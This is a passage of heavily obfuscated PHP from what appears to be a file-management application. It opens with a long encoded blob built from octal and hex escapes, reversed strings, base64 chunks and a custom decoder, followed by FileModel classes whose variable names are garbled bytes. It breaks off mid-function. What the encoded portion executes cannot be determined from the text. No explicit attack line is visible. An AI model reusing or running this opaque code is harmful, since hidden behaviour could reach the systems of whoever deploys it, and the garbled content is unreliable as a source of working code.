\70\303\136\114\77\324\104\55\71\155\241\111\105\367\50\351\327\335\121\204\42\240\105\21\240\117\362\322\123\245\25\57\241\373\5\166\363\310".strrev('•jhª›‹mE--g!-:äò½`gJúAõÅWWPõ;Z[ĞI^+EN‘îÑ'."\n".'†¿Í€l]Ã')."\x66\x17\x53\x4d\xa8\x43\x16\x4\x25\x6b\x56\x40\x32\x47\x4b\x32\x50\xa5\x9a\x56\xd1\x6\x8\x1e\xf9\x59\x88\x67\x57\x2f\x5d\x12\xcc\x40\xcd\x40\x70\x3a\xa5\xeb\x41\xaa\x5e\x9e\x9f\x49\xa7\x11\xd\x5a\x6d\x66\x61\x4b\x52".base64_decode('26SfVE1bYmgcdE3V7K6+Whsi27uwrVnqrSze010SNNRMusLiFqKhEIop8spKuhkh5VEm9qBliw==')."\221\137\125\136\205\66\36\110\251\131\370\360\371\20\23\30\173\164\201\226\24\226\56\241\7\177\124\140\17\262\310\222\140\141\251\72\333\114\140\127\376\61\20\125\310\45\245\163\11\117\145\165\230\56\220".strrev('Cx›Mà1òŠTÀéuâís³^¸g‚p¨º2t•´S'."\r".'HĞÇPT²TEQ¦¤CBî#š©o')."\xf4\xa5\xc6\x2d\x5b\xca\xd3\xc0\x26\xc9\x9b\x15\x2a\x64\xbc\x49\x14\x25\xbd\x69\x14\x4\x32\x8d\xec\xa0\xee\xcf\xf0\xe5\xa0\x16\x92\x29\x58\x86\xff\xca\x3a\xd1\xce\x15\x32\xc2\x8f\xf7\xae\xcc\x1e\xd4\x23\x66\xb1\xde\x9e"."\352\300\254\55\133\202\31\324\334\107\175\141\254\33\20\245\171\274\67\340\56\117\106\2\240\27\5\41\301\133\222\243\335\151\200\147\323\202\263\244\323\7\241\241\257\121\265\375\246\246\245\75\202\151\353"."\xc3\x3c\x9d\xc9\x56\xd4\xb9\x43\x56\x37\x53\xbf\x10\x91\x82\x1c\x3c\x93\xab\x45\xb0\xa5\x53\x72\xee\x82\x73\xcd\x38\x51\x3\x75\xda\xc5\xea\xe3\xf4\x2c\xc0\x64\xe6\x21\xf7\x4b\x2e\xcb\xe4\x23\xca\x2a\x5\xe4\xe1\x50\xa1"."\340\42\134\30\241\312\31\331\114\177\120\120\33\256\260\21\110\111\237\12\130\204\321\72\117\72\325\302\367\144\120\73\160\226\74\102\10\263\125\24\324\121\244\223\266\104\42\14\226\122\60\205\140\211\354".base64_decode('JXaqmCk4LuqpsduKKvbe7npjxOBFqjQQ6zVVsafTqggl4DlIMkUHl9CvEfY721TFBmEPmSapzw==')."\50\142\245\217\220\212\125\32\322\354\234\41\340\130\164\54\262\17\13\363\173\170\355\274\73\16\126\277\241\116\120\223\231\176\46\377\75\165\72\242\27\173\212\75\113\370\162\146\323\310\250\43\143\376\7"."\350\25\35\57\4\257\256\167\305\143\311\130\13\76\125\354\276\313\343\151\163\361\40\143\163\357\24\362\170\207\66\355\102\243\24\113\10\16\46\10\51\200\15\305\122\76\57\254\50\50\22\213\35\265\251".strrev('åÒöŒ—huMGŸpô™¼UÔíg’ K©\'w²OĞ¿B\\W3'."\0".'£Ôz×È¦û¦cÉ¦Ÿò')."\x96\x54\x73\x34\xba\x1\xf5\x9\xa8\x13\xa2\x10\x4\x9a\x2a\x97\x5b\x35\xd5\x42\x81\x57\x44\xab\x7d\xd5\x35\x81\x59\xb5\xd5\xe5\x39\xdc\x3a\xc6\x9d\x4f\xad\xe2\xf5\xd3\x12\x24\x13\x9e\xea\x4\x46\x82\x79\xe\x68\x89\x46"."\302\235\111\75\2\74\104\175\303\202\100\235\264\352\317\330\362\361\3\36\156\21\172\265\105\223\101\65\340\32\126\5\320\360\373\370\244\260\373\60\363\56\121\55\7\151\326\102\267\374\15\165\165\165\376"."\272\172\362\77\32\53\242\63\360\306\272\272\262\42\165\165\215\354\177\236\301\356\304\1\5\335\71\314\37\26\264\307\177\106\115\23\72\4\133\56\71\215\227\220\347\355\151\241\236\35\64\332\65\230\26"."\151\267\102\260\217\171\313\107\132\353\172\10\136\143\167\236\20\313\51\57\226\47\340\111\205\101\27\212\253\27\153\30\46\314\45\101\156\6\25\350\260\270\377\42\305\344\262\131\314\357\146\244\253\226\160"."\76\335\243\176\54\200\320\345\211\362\361\42\77\146\370\325\7\13\241\22\247\164\312\325\23\51\347\366\275\117\123\10\323\224\22\63\114\23\24\331\55\345\216\225\367\4\150\124\325\25\141\331\342\206\211"."\xc5\xb2\xc2\xd9\x1a\x8d\x76\x8a\x96\xf8\x5b\x98\xdc\x7d\x6\xc0\xad\xc2\xd2\x1b\xb2\x46\x75\xc9\xa5\xd0\xe8\x69\x22\xc6\xc0\x48\xb7\x28\xc4\xbd\xb4\xe2\x5c\x85\xc2\x12\x37\x22\xa5\xb8\x50\xbb\x96\xaa\xa9\xc0\xe0\x31\x87"."\140\303\31\145\5\220\11\320\225\252\52\74\27\323\202\70\222\244\273\46\371\204\237\166\324\117\373\335\50\241\110\10\131\110\274\22\312\355\203\260\277\32\220\26\36\145\157\26\205\351\103\325\334\110\254".base64_decode('cVrZJDveCWbz5rr+8Oq/Y0yZPdSCSHyEijqmhDGB62+0CGf8SgPeLE+dEFeeKKsA6eWlmY5JhQ==')."\xd2\x34\xdd\x53\x9a\xb9\xdd\x6f\x11\xaf\x8b\xa8\xbe\xf8\xb9\x9c\x4b\xd1\x78\xb6\xe1\xf9\x36\xa9\x6e\x8a\x6d\x8c\x28\xa7\xd9\x40\xa1\x68\xd\x12\x4c\xb0\x55\xa0\x91\xf4\xae\xca\xc9\xa2\x78\x79\xc9\xa\x85\x44\xef\xd5\x72".base64_decode('aiK9B21zKUMr/ouMtNgllaKKFoRMdK9wJaNFPOarJtJjsqpywU4l7jbo+dudInr2IUiHYhWnaA==')."\344\355\1\125\65\322\123\214\361\75\100\25\121\205\16\213\110\342\105\245\142\352\123\354\106\72\335\45\275\176\351\56\274\232\12\5\161\1\52\32\47\136\174\24\64\205\255\66\341\123\14\125\251\351\344"."\x48\x4d\x44\x77\x3a\x4f\xe3\x32\x17\x97\x76\x52\x92\xd1\xdd\xac\x99\x4\x48\xe0\x58\xe9\x17\x68\x3\x4c\xe5\xdc\x33\x9f\x72\xd\x36\x22\x3f\xa4\x56\x73\xe7\x51\xb4\x4e\x5a\x2e\xad\xc7\x57\xb6\x5d\x86\x81\xcb\x79\x0\x11"."\21\235\117\261\71\107\377\104\272\172\153\110\301\243\253\2\63\112\156\332\35\247\340\156\110\131\16\356\225\120\206\362\214\273\240\15\64\12\232\251\304\150\353\170\141\153\24\7\301\125\237\217\46\153\26"._kodDe('Mbqo375dk9JWJbPvouSp/liECygrQ49aj2hi1NUuN1av4TkgglWFjwr1um0hwjNp+XxpDVwqPx0=').base64_decode('6LrECBB8pxwfsh9krH3k6Cb3RJjHHr6n4IfoOARio1G3my9QdjxNbYjwC8khKuHq01jfF7PX1A==')._kodDe('KNoglUjuWOcrASRL4oKafts02ZRj/6J/D6KgQy8rXhG7P1d41J917+I5WFBqisvKSToyyBvXNQQ=')."\155\143\246\300\236\342\122\4\22\236\250\327\224\205\326\120\164\323\110\124\141\47\30\63\343\40\77\202\17\161\111\23\20\26\224\73\310\53\127\157\303\300\171\22\327\124\302\121\241\177\320\252\150\223\366"."\40\57\55\120\200\23\53\232\51\253\230\246\73\272\342\370\57\357\304\315\101\65\312\324\62\160\305\310\107\174\324\46\250\367\130\205\50\322\225\32\112\71\45\325\27\255\362\316\27\211\51\12\310\12\113"."\355\257\327\4\57\256\363\226\171\144\266\222\301\312\127\142\313\75\342\155\46\50\340\252\71\114\222\227\50\365\213\133\166\17\257\214\26\364\232\312\45\243\271\74\155\200\71\323\244\43\260\325\74\322\54"."\175\137\107\216\114\255\302\276\131\126\205\347\121\316\120\332\325\253\71\66\125\60\352\306\131\254\224\123\341\123\54\113\201\150\12\61\15\50\301\132\11\44\310\30\67\121\141\315\137\337\340\107\257\324\252"."\xad\x3d\x1e\x33\x61\x97\x23\xeb\x4c\x41\x3\x7a\x50\x47\x52\x7\x96\x47\x50\x4e\x96\xb1\x14\xc5\x5\xe6\x9e\x52\x7a\xd2\x63\x3e\x39\xc5\x7c\x32\xe7\x9d\x22\xc6\xb4\xa\x55\x22\x2f\x15\x6d\xb9\x59\x92\x57\x17\x53\xe4\x73"."\x58\xd0\xec\x56\x97\x21\x99\xa7\x0\x59\x9\xee\x7c\x78\x9c\x4d\xf2\x60\xdc\x51\xa6\x7b\xdf\xf2\x34\x2\x8f\x8\xaa\x7a\x65\xac\x96\x54\x52\x95\x26\x76\x24\xc9\xe2\xda\x92\x12\x4\x52\x77\x92\xa\x5a\x5\x49\x93\xc9\x49"."\113\44\226\153\32\123\244\3\120\162\277\102\160\64\257\251\245\176\205\134\262\322\216\161\341\375\205\152\361\323\235\134\330\214\331\152\4\163\5\356\331\256\10\67\213\160\325\26\111\242\324\250\211\56\202"."\120\244\320\325\336\25\24\111\315\142\365\161\211\216\164\136\334\202\246\1\346\230\11\7\321\321\134\46\245\105\143\53\42\55\241\150\153\44\261\122\33\244\267\320\122\143\236\164\127\147\253\122\267\245\116".base64_decode('Hl8UTHrOwY7Y2y/eEqRBfz852vjT4khoy8MfGxQ0Jt+JdjfLsc8slrWYp1b+2bI69E6gQumsFA==')."\130\53\205\13\105\263\274\374\270\111\225\365\225\36\53\25\112\25\172\3\345\53\177\201\75\4\251\226\46\114\221\231\237\252\363\231\374\110\306\316\310\5\216\65\306\325\326\103\255\35\221\116\75\24\215".strrev('·ÒyTB*1º<ËÀ]Éğ†ğ–©ğB»iÕ*Ÿ!f£×Õ°©/ó€H,Ê›êÒi¬»VÆ')."\x50\x34\x32\xb6\xa9\x24\xf0\xa7\x61\xd1\xce\xdd\xc8\x66\x95\x3c\x7a\x83\xa4\x44\x4b\xee\x9d\xb4\xe2\xa7\x74\xfe\x1\x4c\x53\x34\xd3\x2b\x15\x88\x47\x56\xb4\x27\xff\xd7\x5d\xcd\xa4\xa5\x72\x73\x46\x68\xa6\xb\xaf\x29\xfc".base64_decode('/b4W3o77m/KVyPKU/+2TyD7Fmynz14qPsVvsRAccPU+LxHTuuFR+gvAnxfGCemEdTKP1PkH8MA==').base64_decode('WuDSiDzX0FLQCP0KP2hnLCb0xBMQChAJBQGAu9RFPW86e43LXC82l32DPdHH83roKEjJPjkmEg==').strrev('¬¾\\ut–pJeT›UÚ!	qÁ\\áÉÇ0É?ı¶»v…Ç×ñÕ¤Ö€¢r¥&¶HB§7ª²X¦').base64_decode('gV9mpFaeA6nGqJUbL0twCe2i2GuhB06foswPWCp0mb0ZNT/2sRCXhfjIAcN0yt8C5tX/v1TkmQ==').strrev('‚BûÓÊV†y6ç®y]™\'ÔşbºÊ¨b›İJ»sBÑ…À)Q¬‡´´ÆúeËíŠ»Û'."\0".'å	')."\x60\xc6\xa9\x22\x13\x1e\x6e\x59\x61\xa5\x6f\x33\xf8\x4f\x2f\xfc\xe2\x5e\xe8\xed\x4\xa7\x6e\xf0\xc9\x5a\x81\x80\x6e\x53\x1\x25\xa1\xc3\x94\xb2\xe\x56\x8b\x90\x93\x82\x91\x77\x3d\x4e\x4b\xfa\x5e\xe9\xbd\x6b\xea\x5e\xdd"."\375\234\252\174\245\126\156\266\356\127\73\205\216\203\55\27\213\355\270\336\211\115\132\111\143\320\307\161\227\222\77\31\153\36\127\303\252\25\31\353\71\311\104\61\245\364\124\261\24\123\174\354\245\164\116".strrev('	ÊçL(æuÛ\'uä	EË¯òU÷Q‘¼‚…'."\n".'O«„‰ŒÁ‘HUyrÒÕWO«*›¼õ')."\145\57\224\267\244\74\21\156\114\113\371\10\277\31\162\245\26\225\103\237\372\256\6\277\55\222\376\54\240\70\351\147\27\277\63\6\200\251\115\342\75\276\20\364\23\152\43\316\306\301\362\173\177\252\142".base64_decode('B3SEqjShLtmwxc5WAfVUBgW0JZpEB3WRcROJdJq/IM/og0rWcFl6nowtK4fP3ld6SpebabCfVg==')."\163\100\34\162\124\17\207\122\235\310\373\100\74\66\54\254\344\174\174\164\76\261\106\370\133\367\225\136\271\367\211\207\157\175\334\217\277\17\136\274\367\311\347\354\77\354\115\136\351\22\243\100\340\57\151"."\25\35\211\140\26\304\321\242\354\164\342\75\230\10\310\171\52\304\275\160\244\62\100\257\210\133\252\103\300\340\104\304\175\72\3\150\310\221\53\103\55\25\263\76\246\14\342\103\255\116\17\134\134\40\227"."\x63\x55\x67\xcd\x63\xad\x28\xa2\xb1\xac\x3a\xca\xee\x62\x56\x3e\xad\xcd\x7b\x24\x27\x50\x9d\x95\x8f\xec\xc\x98\x72\xb0\x63\x5c\xda\x4d\xd\x1b\x97\xf4\x17\xf1\x72\xdd\x5b\x2c\xe3\xc2\x6f\xb2\x53\x4b\x5b\x79\xfe\x62\x45"."\331\146\301\170\0\344\221\322\15\163\346\55\122\5\43\162\362\345\355\63\76\274\305\177\200\341\221\350\244\271\240\351\323\360\305\14\225\130\260\114\267\231\20\276\206\43\267\34\317\46\361\277\132\134\312"."\211\204\27\125\75\10\262\274\242\225\245\7\343\34\275\20\160\212\206\373\360\127\341\214\203\273\54\3\137\305\47\256\225\135\317\127\266\3\162\306\202\241\41\214\107\100\24\26\164\76\223\32\146\16\346"."\330\27\270\221\240\317\66\307\174\34\140\76\365\346\233\37\156\244\76\31\35\214\300\130\305\274\220\221\165\251\143\126\141\270\24\104\362\20\300\72\51\211\17\207\52\356\130\156\165\63\307\350\247\304\66"."\231\101\253\56\106\25\24\55\103\146\171\55\232\242\346\233\212\105\51\116\151\45\100\172\276\306\221\332\242\212\133\266\102\27\335\55\360\31\250\200\40\262\157\156\372\325\52\316\306\124\2\56\143\356\101"."\x82\xb0\x4a\x66\x2b\xe7\xd9\xca\x7\x60\xa\x4b\x26\x1f\x8e\xe5\xb3\xe3\x95\x86\x5e\x61\x8\x1f\x82\xd7\x78\xc\xd\x2e\x97\x5d\x57\x14\x97\xdc\x13\xe4\xe9\x5\xe7\x73\x5\xce\x30\xc3\x46\xf5\x80\xed\x37\x1c\xbf\x60\x96"."\x62\xc\xbe\xc0\xfb\xc9\x13\xbf\xa7\x49\x52\x50\x8a\x14\xfb\x7c\xda\x54\x85\xca\xfc\x45\xf0\x75\x23\x91\x52\xc9\x93\x23\x41\x37\x34\x53\x88\x48\x90\x92\xcb\x1b\x29\xe6\xa\x44\x7a\x34\x64\xa4\xc7\x45\x86\x94\x27\x74\x54"."\127\32\254\41\25\127\313\233\346\373\60\223\302\113\361\31\223\267\301\40\200\70\61\225\25\346\212\45\264\102\270\147\61\24\265\115\335\273\334\51\72\310\116\73\226\32\226\150\102\367\77\141\246\111\72".strrev('&gá°€Lä´»qëŸi>X	mwƒŞ\'ÜëÕw˜?8DÆ¶%‰=¦â…uœ¸“…:à')."\374\153\12\323\41\371\13\31\352\54\345\144\104\21\174\263\103\245\310\164\271\114\242\116\213\75\13\30\35\61\121\203\176\365\32\223\77\350\302\303\170\332\21\135\146\264\267\322\172\224\146\335\76\151\312"."\355\303\15\331\67\355\210\43\230\343\14\132\107\310\77\52\354\21\14\10\37\302\162\315\253\303\53\12\141\20\311\250\54\106\126\300\101\4\272\115\157\264\5\361\346\162\162\317\200\334\54\303\21\200\134".base64_decode('ZBYCI5KMsLgwE0AP1ujY2sA7RcKve6+ly45u0u+MZWX7jSK1lR92UJWqUsTrrSNhDJhqn3uYHA==')."\233\44\62\143\352\76\111\103\150\132\245\152\222\102\261\55\250\240\320\100\326\26\111\121\132\21\352\235\120\330\57\330\20\133\351\130\5\211\10\236\66\24\323\160\330\301\75\220\140\372\321\356\47\235\24"."\316\255\254\230\354\76\141\360\204\212\66\206\122\224\253\140\16\353\140\32\124\117\101\261\2\236\300\153\141\277\350\133\216\364\217\71\62\3\62\250\222\76\127\122\31\301\114\272\46\327\225\250\316\233\244"."\161\1\267\363\104\250\101\157\272\233\225\143\55\57\144\253\260\165\135\237\224\153\301\224\327\26\224\105\255\102\315\67\334\222\103\364\260\340\257\363\173\22\352\375\236\346\62\66\277\240\361\54\32\265\63".base64_decode('3AqLyrHiVHKEkkJ218Yu5v3ldRRXAOrlfdkSrUwxRKektJSGVHgg5ekqWox1hlKlXA0zIHQXEg==').strrev('oIûPîì›€{2&‡ÆîœŠ¹:„u}aâÆMò¼¦'."\n".'¨½ï»N^¥ÇPOœ½¨H¥>-E5Â')."\114\332\54\201\131\164\211\312\27\22\234\134\241\105\134\112\273\255\334\25\3\3\164\5\252\12\155\335\205\251\135\224\173\71\56\255\124\54\145\25\355\262\203\3\146\122\126\332\42\271\161\224\105\14\240"."\x66\x49\x77\x9e\x2c\x6a\x33\xe5\x98\x69\x8d\xb2\x7\xae\x13\x4f\xcf\xdc\xba\x39\x7d\x1f\xd6\x9c\x78\x8f\x96\x94\x9c\xfb\x11\x25\xe1\xe8\x95\x98\xe3\x87\xee\x47\x62\xdc\xd\x5e\x3c\xc\x72\x1d\x51\xa9\x62\x43\x16\x77\xe5"."\127\51\217\40\156\302\161\141\230\174\355\320\373\312\241\373\125\303\106\105\274\314\137\201\164\75\207\132\66\153\235\126\213\344\153\74\171\224\156\114\235\113\305\0\362\116\236\172\362\242\176\104\251\151\117"."\x90\x61\x21\xdc\x6\xac\xd5\x73\x3a\x6a\x85\x51\xa1\x8b\x94\x97\x31\x32\x5c\x7e\x8a\x86\x2f\x38\xc5\xf1\x58\x31\x9e\xeb\x2c\x73\xbc\xeb\xb6\xec\x53\xea\xb3\xe3\x16\x17\x8c\xb9\xe4\x63\xa0\x5d\xa1\x26\x29\x97\x4f\xe4\xd4"."\232\166\277\170\313\62\131\62\276\174\2\55\50\367\345\156\165\5\141\27\135\266\377\226\62\121\45\233\325\102\357\372\344\227\72\156\210\110\77\217\54\233\337\20\206\274\307\110\245\126\267\113\42\240\50"."\67\244\30\45\11\227\337\152\313\313\166\205\251\305\152\124\244\40\31\13\117\272\102\210\345\126\151\214\110\246\134\236\330\322\351\66\143\244\102\321\164\331\231\222\244\210\242\214\251\127\274\154\111\103\54"._kodDe('MEJhKOuBgj10cJyX0/nAQIVhzVUEkrGDV710jxaoqdPYDjk6g93Q+GwOO74zIy+Slf54eA2efrc=')."\x4f\xba\x7d\x8a\x89\x62\x62\xce\x48\x19\x66\xc6\xe9\x77\xa5\x7a\x8e\xea\x54\x98\x89\x7c\xa8\x27\xb\xc4\x7b\x4a\xf3\x15\xa5\x80\xa\xa\x98\xd9\xa8\xd2\x9c\xaa\xf0\x30\x65\x85\x44\xe5\x8f\x48\xac\x74\x83\x58\x91\xed\xca"."\xc\xe4\x74\x2c\x17\xf0\x95\xbd\x4d\xc\xc\x4a\xc6\xd5\x4c\x57\x77\x2a\xa0\x6\x1e\x4d\x54\x9\x72\x79\xa6\x95\xcd\xd2\x6b\xed\x29\xb2\xb9\x2e\xb6\xb2\x13\x97\x97\x90\x12\x3d\xde\x21\x76\xdc\x96\xb\x87\x27\xe6\x98\x78"."\x8a\xe7\x85\xdc\x59\xbc\xbc\xe9\x81\x9b\x5a\xc1\xb\x53\x5e\xc3\xf5\xcc\xb6\x9a\x3e\x9a\x71\x52\x43\x8a\x6c\xa0\x3c\xb3\x3c\xbd\x58\x36\xcd\xd0\x81\xca\xe3\xf0\xf6\x16\x67\xd9\xab\x9\x25\x1b\x29\xeb\x8f\xa2\xa6\x95\xb4"."\52\324\341\75\252\130\215\147\321\232\362\130\346\252\73\5\10\150\135\236\105\353\226\145\143\345\62\270\262\172\216\121\262\247\30\136\71\360\100\354\231\256\60\140\51\116\124\212\116\5\317\212\205\313\77".base64_decode('B2vAW5oJ1yr3QpE+utVoKvWiYuEpe+EtLfkgegivlFNxgYLKSIUdA3Mq7BGc/k2pjCZ1tco3Kw==')."\231\127\101\135\14\174\211\171\234\224\125\310\126\165\317\52\153\247\305\53\322\67\333\255\101\346\111\167\75\161\300\111\22\217\24\315\15\252\361\262\120\240\224\55\21\206\61\233\31\226\232\272\150\142\64".base64_decode('w7W9lfLDeUtsmWmpnS06UtaAex3kS8oLPxWNnHxUbFYuksri0xWqeRg/8VtOJqWor0oTFzGyjA==').base64_decode('PAJnpUzbe/MghXguzadKYnqaxIMBeS3H21N4NIkgLiNEzhnBhSXXeWihCjfirpvdO3BOgmcnrA==')."\xa2\xe3\xe3\xfa\xf8\x5\xf6\xdb\x6c\x39\x8e\x54\x15\xc2\x5b\x10\x72\xe\xa0\xec\x80\x4f\xd1\x88\x23\x21\x79\xc9\x4d\x3b\xc5\xee\x4a\x19\xe\xf3\x7b\xc\x1a\x4\xed\xb\x2a\x77\x4a\x98\x3c\x97\x11\x3d\x57\x84\xde\xca\x8a"."\110\274\374\122\266\115\274\261\62\154\245\373\255\61\164\35\115\60\107\201\211\342\55\23\74\114\52\72\173\314\125\216\35\344\71\101\170\153\322\317\156\120\374\340\314\170\175\141\320\125\235\277\71\56\364"."\354\77\254\5\270\75\220\115\360\207\346\230\264\30\14\37\23\311\104\131\126\127\50\221\130\35\213\267\362\167\351\312\262\131\55\105\31\262\54\253\253\75\326\71\125\136\270\43\24\211\226\345\121\275\311"."\116\135\372\37\347\131\221\56\326\113\246\116\60\125\57\42\55\53\145\117\360\42\63\12\117\246\313\111\120\156\363\12\103\126\176\252\171\304\6\22\6\172\170\124\57\266\314\234\164\132\57\33\161\13\335"."\324\313\57\33\237\304\21\1\367\143\322\36\45\145\267\162\16\142\56\64\113\365\43\73\341\113\361\2\244\322\307\375\4\1\20\347\11\251\246\23\160\151\10\51\351\154\221\60\252\243\254\135\165\167\147"."\x37\xc1\x42\x16\xc7\xb2\x67\x55\x84\x66\x85\x5b\x49\x55\x1\x8a\xe6\x4a\xe0\xd0\x6e\x9e\x86\xaf\xf3\xac\xb7\xfa\xe5\x11\xe\xce\x76\xe0\xe8\x0\xc0\xad\x68\xc4\xf2\xb0\x2b\xdb\x31\x6\x51\x54\xea\xd2\x7d\xe1\x12\x74\x4a".base64_decode('FKRs+/8CRhPxRGvFAAA=')."", 10, -8))); goto cÜàƒ“·¡Ÿ; DÕ…íò: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\x6c\145\137\x63\x6f\x6e\x74\145\x6e\x74\163"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\124\151\155\x65", "\x74\x69\x6d\145", "\x69\x6e\163\x65\x72\164", "\x66\165\x6e\143\164\x69\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\154\x65"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\x61\x6d\x65" => "\151\157\x5f\x66\x69\154\145\137\x6d\145\164\x61", "\155\145\x74\141\x46\151\145\x6c\144" => "\x66\151\x6c\x65\x49\104"); public function fileInfo($«±ô€Ã) { $ŒæüŸü =& $_SERVER[öæÛ¿©¿]; static $›şÚé»º = array(); if (!isset($›şÚé»º[$«±ô€Ã])) { $¬·ÅáşÒ = $ŒæüŸü[2180]; $‚™ÑøÏ­ = Model($ŒæüŸü[556])->field($¬·ÅáşÒ)->where(array($ŒæüŸü[554] => $«±ô€Ã))->find(); $›şÚé»º[$«±ô€Ã] = $‚™ÑøÏ­; } return $›şÚé»º[$«±ô€Ã]; } public function addFileByContent($ß”Ù£ = '', $Ä‚Šö‘­, $¿ê•ˆ¾Ç = '') { $èÒœˆ¾÷ =& $_SERVER[öæÛ¿©¿]; $êŸ™éÃ‘ = TEMP_PATH . $èÒœˆ¾÷[2181]; if (!is_dir($êŸ™éÃ‘)) { mk_dir($êŸ™éÃ‘); } $ó•À¬‡ú = $êŸ™éÃ‘ . $èÒœˆ¾÷[2182] . rand_string(16); $ûø¸Õ = file_put_contents($ó•À¬‡ú, $ß”Ù£); if ($ûø¸Õ === !1 || strlen($ß”Ù£) != $ûø¸Õ) { return !1; } $ŠôàÖá = $this->addFile($ó•À¬‡ú, $Ä‚Šö‘­, $¿ê•ˆ¾Ç, !0); if (file_exists($ó•À¬‡ú)) { @unlink($ó•À¬‡ú); } return $ŠôàÖá; } public function createFileName($€úâÎŞØ, $ÍÚÄÎ†¸, $Ÿ½úßêÏ = false, $­¬Ã‹óò = false) { $¼Ò¸éÌü =& $_SERVER[öæÛ¿©¿]; $Âùœ€˜  = IO::init($¼Ò¸éÌü[8]); $Å·ÓÍéã = $this->_makeFilePath($€úâÎŞØ, $ÍÚÄÎ†¸, $Âùœ€˜ , $Ÿ½úßêÏ, $­¬Ã‹óò); $¯çËìĞ§ = $Âùœ€˜ ->pathFather($Å·ÓÍéã); static $é°±‹ªã = false; $Ù¨åê‚¼ = $¼Ò¸éÌü[2183] . md5($¯çËìĞ§); if (!$é°±‹ªã && !Cache::get($Ù¨åê‚¼)) { $é°±‹ªã = !0; $’ó„«Í = IO::mkdir($¯çËìĞ§); if (!IO::exist($’ó„«Í . $¼Ò¸éÌü[894])) { IO::mkfile($’ó„«Í . $¼Ò¸éÌü[894]); } Cache::set($Ù¨åê‚¼, 1, 3600 * 2); } return $Å·ÓÍéã; } public function _makeFilePath($¢ıäòÕ÷, $œ§ÃŸÎı, $ü®¤÷–, $¹Á¼©è = false, $¿èç¢æ = false) { $ã¤ìöê =& $_SERVER[öæÛ¿©¿]; $Ş€×ı¬ = Model($ã¤ìöê[865])->get($ã¤ìöê[2184]); $Ò×Ïí± = $ã¤ìöê[1370] . $œ§ÃŸÎı[$ã¤ìöê[483]] . $ã¤ìöê[495] . date($ã¤ìöê[2185]); $Òƒ­½‹ = $Ò×Ïí± . rand_string(5) . short_id(100); $¢ıäòÕ÷ = str_replace($ã¤ìöê[8], $ã¤ìöê[11], KodIO::clear($¢ıäòÕ÷)); $ŞŞİá¶ = $ü®¤÷–->ext($¢ıäòÕ÷); if (!$¢ıäòÕ÷) { $Ş€×ı¬ = $ã¤ìöê[871]; } switch ($Ş€×ı¬) { case $ã¤ìöê[2186]: if ($ŞŞİá¶) { $Òƒ­½‹ = $Òƒ­½‹ . $ã¤ìöê[10] . $ŞŞİá¶; } if ($ŞŞİá¶ == $ã¤ìöê[2124]) { $Òƒ­½‹ .= $ã¤ìöê[1339]; } break; case $ã¤ìöê[2187]: $í¿Ü‡Ã = Model($ã¤ìöê[865])->get($ã¤ìöê[866]); $±äëĞ³Ì = substr(md5($ã¤ìöê[867] . $í¿Ü‡Ã . date($ã¤ìöê[841])), 0, 8); $Ò×Ïí± = $ã¤ìöê[1370] . $œ§ÃŸÎı[$ã¤ìöê[483]] . $ã¤ìöê[495] . date($ã¤ìöê[2188]) . $±äëĞ³Ì . $ã¤ìöê[8]; if ($ŞŞİá¶ == $ã¤ìöê[2124]) { $¢ıäòÕ÷ .= $ã¤ìöê[1339]; } $Íšõë½ß = $ã¤ìöê[2189] . $Ò×Ïí± . $¢ıäòÕ÷; CacheLock::lock($Íšõë½ß); $Òƒ­½‹ = $Ò×Ïí± . $¢ıäòÕ÷; if (IO::exist($Ò×Ïí± . $¢ıäòÕ÷)) { $§§Ëş® = substr($¢ıäòÕ÷, 0, strlen($¢ıäòÕ÷) - strlen($ŞŞİá¶)); $ÆÅ¶Ó„Ì = $¿èç¢æ ? substr($¿èç¢æ, 0, 5) : ($¹Á¼©è ? substr($¹Á¼©è, 0, 5) : rand_string(5)); $ÆÅ¶Ó„Ì .= rand_string(3); $Òƒ­½‹ = $Ò×Ïí± . $§§Ëş® . $ÆÅ¶Ó„Ì; if ($ŞŞİá¶) { $Òƒ­½‹ = $Òƒ­½‹ . $ã¤ìöê[10] . $ŞŞİá¶; } } if (IO::isOsDriver($Òƒ­½‹) && !IO::isUploadServer($Òƒ­½‹)) { if (IO::exist($Òƒ­½‹)) { CacheLock::unlock($Íšõë½ß); return $Òƒ­½‹; } $“ ±»É« = IO::setContent($Òƒ­½‹, $ã¤ìöê[12]); if (!$“ ±»É«) { show_json($ã¤ìöê[2190], !1); } } CacheLock::unlock($Íšõë½ß); break; case $ã¤ìöê[871]: break; default: break; } return $Òƒ­½‹; } public function addFileByRemote($ïøˆáçÃ, $Ô©¿ûîƒ, $Œı™ÀÊˆ = array()) { $ß‡“¦Ä› =& $_SERVER[öæÛ¿©¿]; if (!IO::isFile($ïøˆáçÃ)) { return !1; } $åÏª•³û = $Œı™ÀÊˆ[$ß‡“¦Ä›[559]] ? $Œı™ÀÊˆ[$ß‡“¦Ä›[559]] : $ß‡“¦Ä›[12]; $„Üµ“›Æ = IO::hashMd5($ïøˆáçÃ, $åÏª•³û); $âœöíª’ = KodIO::parse($ïøˆáçÃ); $Ø†¯è¬Ã = array($ß‡“¦Ä›[636] => IO::size($ïøˆáçÃ), $ß‡“¦Ä›[2191] => 1, $ß‡“¦Ä›[505] => $Ô©¿ûîƒ, $ß‡“¦Ä›[908] => $âœöíª’[$ß‡“¦Ä›[483]], $ß‡“¦Ä›[506] => $ïøˆáçÃ, $ß‡“¦Ä›[2192] => $Œı™ÀÊˆ[$ß‡“¦Ä›[691]] ? $Œı™ÀÊˆ[$ß‡“¦Ä›[691]] : IO::hashSimple($ïøˆáçÃ), $ß‡“¦Ä›[2193] => $„Üµ“›Æ ? $„Üµ“›Æ : $åÏª•³û); if ($ÃÀìÇ = $this->addFileCheckExist($Ø†¯è¬Ã[$ß‡“¦Ä›[691]], $Ø†¯è¬Ã[$ß‡“¦Ä›[559]], $Ø†¯è¬Ã[$ß‡“¦Ä›[79]])) { return $ÃÀìÇ; } return $this->addFileData($Ø†¯è¬Ã); } private function addFileData($©¿Ç„ç») { $èá’Ïí =& $_SERVER[öæÛ¿©¿]; if (!$©¿Ç„ç») { return !1; } if (!IO::isFile($©¿Ç„ç»[$èá’Ïí[87]])) { return !1; } $©¿Ç„ç»[$èá’Ïí[79]] = intval($©¿Ç„ç»[$èá’Ïí[79]]); if (!$©¿Ç„ç»[$èá’Ïí[79]] && strlen($©¿Ç„ç»[$èá’Ïí[691]]) > 32) { 